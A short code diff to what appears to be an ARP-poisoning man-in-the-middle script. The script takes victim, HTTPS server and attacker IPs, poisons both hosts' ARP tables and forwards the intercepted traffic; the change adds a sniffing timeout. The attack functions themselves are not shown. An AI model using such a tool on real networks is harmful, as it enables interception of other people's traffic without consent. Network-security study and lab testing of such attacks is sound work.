@@ -11,6 +11,7 @@ parser.add_argument('victimIP', help = 'IP of victim client', metavar = 'victimI
 parser.add_argument('serverIP', help = 'IP of HTTPS server', metavar = 'serverIP')
 parser.add_argument('attackerIP', help = 'IP of attacker', metavar = 'attackerIP')
 parser.add_argument('-i', '--interface', help = 'Preferred interface for sending packets from attacker', dest = 'ifa', action = 'store', default = None)
+parser.add_argument('-t', '--timeout', help = 'Preferred timeout for sniffing packets, default = 60', dest = 'to', action = 'store', default = 60)
 args = parser.parse_args()
 
 #validate input from command line
@@ -23,4 +24,4 @@ arppoison(args.victimIP, args.serverIP, args.attackerIP, args.ifa)
 #poison client entry of ARP table of server
 arppoison(args.serverIP, args.victimIP, args.attackerIP, args.ifa)
 
-startforwarding(args.serverIP)
+startforwarding(args.serverIP, args.ifa, args.to)
